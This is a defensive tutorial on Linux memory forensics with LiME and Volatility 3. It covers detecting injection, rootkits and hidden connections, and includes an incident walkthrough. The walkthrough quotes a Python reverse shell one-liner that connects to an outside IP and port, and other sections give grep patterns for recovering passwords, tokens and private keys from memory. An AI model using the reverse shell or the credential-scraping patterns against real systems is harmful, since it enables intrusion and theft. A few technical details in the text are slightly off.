Memory Forensics

Extracting and analyzing volatile memory to uncover rootkits, injected code, and attacker artefacts.

Overview

Memory forensics analyzes the contents of volatile RAM to uncover evidence that never touches disk. Fileless malware, process injection, rootkits, encryption keys, plaintext credentials, active network connections, and console histories all exist only in memory. If you collect a disk image without capturing RAM, you have lost the most valuable evidence.

Memory is the most volatile data source (first in the collection order), but also the richest. Nearly everything the attacker is currently doing - and has recently done - is reconstructable from a memory dump with the right tools.

Required Reading

  • Processes - process lifecycle, /proc, kernel-to-userspace interfaces
  • Virtual Memory - page tables, virtual address spaces, mmap, VAD
  • ELF - executable headers, sections, segments, PLT/GOT

Memory Acquisition

Linux LiME Acquisition

LiME is the standard kernel module-based acquisition tool. It must be compiled for the exact kernel version of the target system.

# Pre-compile LiME for your kernel versions and store in jump kit
git clone https://github.com/504ensicsLabs/LiME.git
cd LiME/src
make

# Acquire memory to a file
sudo insmod lime-$(uname -r).ko "path=/mnt/evidence/memory.dump format=lime"

# Acquire over network (no local storage needed)
sudo insmod lime-$(uname -r).ko "path=tcp:4444 format=lime"
# On receiving machine:
nc -l 4444 > memory.dump

Linux /proc/kcore

# /proc/kcore is the kernel's view of physical memory
# Limited: does not include device memory, restricted on hardened kernels
sudo dd if=/proc/kcore of=/mnt/evidence/memory.dump bs=1M
# WARNING: /proc/kcore on modern kernels only exposes kernel memory,
# not userspace process memory. This is incomplete for forensic purposes.

Linux /dev/fmem (deprecated)

# /dev/fmem creates a /dev/mem-like device for full physical memory access
# Requires: fmem kernel module
modprobe fmem
dd if=/dev/fmem of=/mnt/evidence/memory.dump bs=1M

Volatility 3

Volatility 3 is the current standard. It is a complete rewrite of Volatility 2 with a plugin-based architecture, automatic symbol table retrieval, and a Python 3 codebase.

# Install on ArchLinux
sudo pacman -S volatility3

# Or via pip
pip install volatility3

# Verify installation
vol --help

Volatility 2 vs Volatility 3

Feature Volatility 2 Volatility 3
Python version 2.7 3.6+
Profiles Manual download, --profile= Automatic symbol tables from ISF
Plugin invocation vol.py --profile=Linux ... pslist vol -f dump.mem linux.pslist
Output format Text tables JSON by default, text with --renderer
Plugin architecture Monolithic scan methods Modular plugins, automagic, layer system
Memory models Single address space Multi-layered address spaces

Essential Volatility 3 Commands

Process Enumeration

# List running processes — your starting point for every investigation
vol -f memory.dump linux.pslist

# Process tree — parent-child relationships
vol -f memory.dump linux.pstree

# Process command line arguments and environment
vol -f memory.dump linux.psaux

# Process capabilities
vol -f memory.dump linux.capabilities

# Find hidden processes by comparing multiple enumeration methods
vol -f memory.dump linux.pslist   # walks the task_struct list
vol -f memory.dump linux.psscan   # scans memory for task_struct signatures
vol -f memory.dump linux.pstree   # process hierarchy

# If pslist shows 47 processes and psscan shows 49, you have 2 hidden processes

Network Analysis

# Active network connections with owning process
vol -f memory.dump linux.sockscan

# Network interfaces and IP configuration
vol -f memory.dump linux.ip.Addr

# Reconstruct network sockets from the netstat structures
vol -f memory.dump linux.sockstat

Process Memory Analysis

# Extract a process's full memory space
vol -f memory.dump linux.proc.Maps --pid 1234 --dump

# Dump a process's executable image
vol -f memory.dump linux.elfs --pid 1234

# List mapped files (libraries, mmaps, shared memory)
vol -f memory.dump linux.lsof --pid 1234

# List DLLs/shared libraries loaded by a process
vol -f memory.dump linux.library_list --pid 1234

# Bash history from memory (recover commands typed on the compromised system)
vol -f memory.dump linux.bash
# This recovers bash command history from all bash processes in memory
# Even if .bash_history was deleted or never written to disk

Kernel Analysis

# Loaded kernel modules — compare with lsmod output to find hidden modules
vol -f memory.dump linux.lsmod

# Check for kernel module hooks
vol -f memory.dump linux.check_modules

# System call table — detect hooked syscalls
vol -f memory.dump linux.check_syscall

# Kernel debug messages
vol -f memory.dump linux.kmsg

Process Injection Detection

Detection of code injection is the most critical memory forensic technique. Attackers inject code to hide execution, evade process-based detection, and maintain stealth.

malfind for Injected Code

# malfind flags memory regions with PAGE_EXECUTE_READWRITE protection
# that also contain a PE header or shellcode prologue
vol -f memory.dump linux.malfind --pid 1234

# Key indicators malfind looks for:
# - Memory region is both writable AND executable (RWX)
# - Memory region is private (not mapped from a file)
# - Memory region contains executable code signatures
# - Memory region is in a process that shouldn't have RWX regions

Injection Techniques

# HollowProcesses — detect process hollowing
# Process hollowing: create a suspended process, unmaps its code,
# replaces it with malicious code, then resumes
# Indicators:
# - Process has executable image that doesn't match its inode on disk
# - Process VAD tree structure is inconsistent with normal process
vol -f memory.dump windows.hollowprocesses  # (Windows-specific)
# For Linux: compare /proc/pid/exe with memory image

# Detect LD_PRELOAD injection (Linux)
# Check if any process has LD_PRELOAD set in its environment
vol -f memory.dump linux.psaux | grep -i 'LD_PRELOAD'

# Detect ptrace-based injection
# Processes being traced (ptrace) show a tracer PID
# Check /proc/pid/status → TracerPid ≠ 0 is suspicious
vol -f memory.dump linux.pstree  # Look for unexpected parent-child relationships

Injection Hunting Workflow

# 1. Find suspicious RWX memory regions
vol -f memory.dump linux.malfind > malfind_output.txt

# 2. For each suspicious PID, dump its full memory space
vol -f memory.dump linux.proc.Maps --pid 1234 --dump

# 3. Scan the extracted memory with YARA for known malware
yara rules/malware/cobalt_strike.yar pid1234_mem

# 4. Extract strings from the memory region for IOCs
strings -t d pid1234_mem | grep -iE 'http://|https://|\.com|\.net|cmd\.exe|pwd|User-Agent'

# 5. Check for shellcode patterns (common instruction sequences)
# NOP sled: 0x90 repeated
xxd pid1234_mem | grep '9090 9090 9090 9090'

# 6. Extract the mapped memory regions to find anomalies
vol -f memory.dump linux.proc.Maps --pid 1234

Rootkit Detection

Rootkits operate at kernel level. They can hide processes, files, network connections, and kernel modules from userspace tools.

# Cross-view detection — compare multiple enumeration methods
# Hidden process check
vol -f memory.dump linux.pslist > /tmp/pslist.txt
vol -f memory.dump linux.psscan > /tmp/psscan.txt
diff /tmp/pslist.txt /tmp/psscan.txt
# Any process in psscan but NOT in pslist is hidden

# Hidden module check
vol -f memory.dump linux.lsmod > /tmp/lsmod_vol.txt
# Compare with lsmod from the live system (if available)
# Modules in the volatile scan but not in lsmod are hidden

# System call table integrity
vol -f memory.dump linux.check_syscall
# Output shows each syscall entry, its expected address range,
# and whether it has been hooked (address outside expected module range)

# Kernel module syscall hooks
vol -f memory.dump linux.check_modules
# Detects modules that have hooked syscalls

# Interrupt Descriptor Table (IDT) hooks
vol -f memory.dump linux.check_idt
# Some rootkits hook IDT entries instead of syscall table

# Hidden network connections
vol -f memory.dump linux.sockscan > /tmp/netscan.txt
# Compare with netstat from live system
# Connections in memory but not in netstat are hidden

Credential Extraction from Memory

# Recover bash history from all processes
vol -f memory.dump linux.bash
# Extracts bash command history buffers from process memory
# These contain typed commands even if .bash_history was deleted

# Find plaintext credentials in process memory
strings -a memory.dump | grep -iE \
  'password=|passwd=|pwd=|secret=|token=|api_key=|credential='

# Extract environment variables from process memory
vol -f memory.dump linux.psaux
# Environment may contain: DATABASE_URL, API_SECRET, AWS_ACCESS_KEY_ID

# Recover SSH private key fragments
strings -a memory.dump | grep -A5 -B5 \
  'BEGIN OPENSSH PRIVATE KEY'
strings -a memory.dump | grep -A5 -B5 \
  'BEGIN RSA PRIVATE KEY'

# Find SSL/TLS session keys
strings -a memory.dump | grep -E \
  'CLIENT_RANDOM|SESSION_TICKET|MASTER_SECRET'

Network Connection Reconstruction

# Full network state from memory
vol -f memory.dump linux.sockscan --output json > netscan.json

# Parse and analyze
python3 << 'EOF'
import json

with open('netscan.json') as f:
    data = json.load(f)

connected = [r for r in data['rows']
             if r.get('State', '') == 'ESTABLISHED']

for conn in connected:
    pid = conn.get('PID', '?')
    src = conn.get('LocalAddr', '?')
    dst = conn.get('ForeignAddr', '?')
    dport = conn.get('ForeignPort', '?')
    proc = conn.get('Process', '?')
    print(f"PID {pid} ({proc}): {src} → {dst}:{dport}")
EOF

# Cross-reference with known C2 IOCs
grep -E '(185\.130\.|194\.26\.|evil.*\.com)' netscan.json

Practical Investigation Walkthrough

Scenario: Web server compromised. Disk image shows nothing suspicious. Memory dump reveals the attack.

# Step 1: Get an overview of the system
vol -f memory.dump banners.Banners
# Shows: detected operating system banner, kernel version, distribution

# Step 2: Identify the attacker's processes
vol -f memory.dump linux.pstree
# Look for:
# - Apache/httpd spawning /bin/sh (web shell)
# - Processes running from /tmp, /var/tmp, /dev/shm
# - Processes with names that mimic system processes (e.g., [kworker/0:1] vs [kworker/0:1] — note subtle name difference)
# - Processes with unusually short uptime (compared to system boot time)

# Example output analysis:
# systemd (1)
# └── httpd (847)
#     └── httpd (852)
#         └── sh (12345)          ← SUSPICIOUS: httpd shouldn't spawn sh
#             └── python3 (12346)  ← SUSPICIOUS: reverse shell?
#                 └── bash (12347)

# Step 3: Investigate the suspicious process
vol -f memory.dump linux.psaux --pid 12346
# Output: python3 -c 'import socket,subprocess,os;
# s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
# s.connect(("185.130.5.253",4444));os.dup2(...)'
# → Confirmed: Python reverse shell connecting to 185.130.5.253:4444

# Step 4: Extract the malicious process for further analysis
vol -f memory.dump linux.proc.Maps --pid 12346 --dump

# Step 5: Scan the extracted process memory with YARA
yara rules/rat/python_reverse_shell.yar pid12346_mem

# Step 6: Check for additional compromised processes
vol -f memory.dump linux.pstree --pid 12346
# Check all children of the reverse shell process

# Step 7: Find the web shell that spawned the reverse shell
vol -f memory.dump linux.lsof --pid 852
# Check what files the httpd worker was accessing
# Look for .php files in unexpected locations

# Step 8: Check for persistence mechanisms
vol -f memory.dump linux.bash
# Did the attacker add cron jobs, SSH keys, or modify systemd services?

# Step 9: Extract IOCs
# IPs: 185.130.5.253:4444 (C2)
# Port: 4444 (reverse shell listener)
# Technique: Python reverse shell spawned via web shell
vol -f memory.dump linux.sockscan | grep "185.130.5.253"
